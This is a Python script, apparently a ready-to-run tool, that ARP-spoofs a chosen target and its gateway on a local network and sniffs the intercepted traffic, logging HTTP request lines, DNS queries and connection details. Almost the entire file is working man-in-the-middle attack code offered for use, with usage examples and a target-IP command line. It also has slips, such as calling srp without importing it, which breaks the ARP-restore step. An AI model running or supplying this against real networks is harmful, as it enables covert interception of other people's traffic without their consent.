"""
WiFi/LAN Traffic Interceptor - ARP Spoof + Packet Sniff
Run as Administrator!

USAGE:
    python312 wifi_sniffer.py sniff                    # Passive listen only
    python312 wifi_sniffer.py spoof <target_ip>        # ARP spoof + intercept
    python312 wifi_sniffer.py spoof 192.168.1.5 --gateway 192.168.1.1
"""

import sys
import time
import argparse
from scapy.all import (
    sniff, ARP, Ether, sendp, get_if_hwaddr, conf,
    IP, TCP, UDP, Raw, DNS, DNSQR
)

# ── Passive Sniffer ──────────────────────────────────────────────
def packet_callback(pkt):
    """Print intercepted packet summary."""
    if pkt.haslayer(IP):
        src = pkt[IP].src
        dst = pkt[IP].dst
        proto = "TCP" if pkt.haslayer(TCP) else "UDP" if pkt.haslayer(UDP) else "???"

        # HTTP requests
        if pkt.haslayer(Raw) and pkt.haslayer(TCP):
            payload = pkt[Raw].load
            if payload.startswith(b"GET ") or payload.startswith(b"POST "):
                try:
                    host = pkt[IP].dst
                    if pkt.haslayer(TCP) and pkt[TCP].dport == 80:
                        line = payload.split(b"\r\n")[0].decode(errors="replace")
                        print(f"[HTTP] {src} -> {host} | {line}")
                except:
                    pass

        # DNS queries
        if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
            queried = pkt[DNSQR].qname.decode(errors="replace") if pkt.haslayer(DNSQR) else "?"
            print(f"[DNS]  {src} asked for {queried}")

        # Generic
        else:
            sport = pkt[TCP].sport if pkt.haslayer(TCP) else pkt[UDP].sport if pkt.haslayer(UDP) else 0
            dport = pkt[TCP].dport if pkt.haslayer(TCP) else pkt[UDP].dport if pkt.haslayer(UDP) else 0
            print(f"[{proto}] {src}:{sport} -> {dst}:{dport}")

def sniff_passive(interface=None):
    """Passively sniff traffic (must be on the same network)."""
    print(f"[*] Passive sniffing (Ctrl+C to stop)...\n")
    if interface:
        sniff(iface=interface, prn=packet_callback, store=False)
    else:
        sniff(prn=packet_callback, store=False)

# ── ARP Spoofer ──────────────────────────────────────────────────
def get_mac(ip):
    """Get MAC address using ARP."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def restore_arp(target_ip, gateway_ip):
    """Restore ARP tables."""
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if target_mac and gateway_mac:
        sendp(Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=False)
        sendp(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=False)
        print("[+] ARP tables restored")

def spoof_target(target_ip, gateway_ip, iface=None):
    """ARP spoof target to intercept their traffic."""
    my_mac = get_if_hwaddr(conf.iface) if not iface else get_if_hwaddr(iface)

    print(f"[*] ARP spoofing {target_ip} <-> {gateway_ip}")
    print(f"[*] My MAC: {my_mac}")
    print(f"[*] Press Ctrl+C to stop...\n")

    try:
        while True:
            # Tell target: "I am the gateway"
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=target_ip, psrc=gateway_ip), verbose=False)
            # Tell gateway: "I am the target"
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=gateway_ip, psrc=target_ip), verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Stopping...")
        restore_arp(target_ip, gateway_ip)

# ── Full Intercept (Spoof + Sniff) ───────────────────────────────
def intercept(target_ip, gateway_ip, iface=None):
    """ARP spoof AND sniff simultaneously."""
    from threading import Thread

    print(f"[*] Starting intercept on {target_ip} via gateway {gateway_ip}\n")

    # Start sniffer in background
    sniffer = Thread(target=lambda: sniff(prn=packet_callback, store=False), daemon=True)
    sniffer.start()

    # Start ARP spoofing
    try:
        spoof_target(target_ip, gateway_ip, iface)
    except KeyboardInterrupt:
        print("[!] Intercept stopped.")

# ── Main ─────────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WiFi/LAN Traffic Interceptor")
    sub = parser.add_subparsers(dest="command", required=True)

    p_sniff = sub.add_parser("sniff", help="Passive sniff (just listen)")
    p_sniff.add_argument("-i", "--interface", help="Network interface name")

    p_spoof = sub.add_parser("spoof", help="ARP spoof then sniff")
    p_spoof.add_argument("target", help="Target IP to intercept")
    p_spoof.add_argument("-g", "--gateway", default="192.168.1.1", help="Gateway IP (default: 192.168.1.1)")
    p_spoof.add_argument("-i", "--interface", help="Network interface name")

    args = parser.parse_args()

    print("=" * 55)
    print("  WiFi / LAN Traffic Interceptor")
    print("  Make sure you're running as ADMINISTRATOR")
    print("=" * 55)

    if args.command == "sniff":
        sniff_passive(args.interface)
    elif args.command == "spoof":
        intercept(args.target, args.gateway, args.interface)
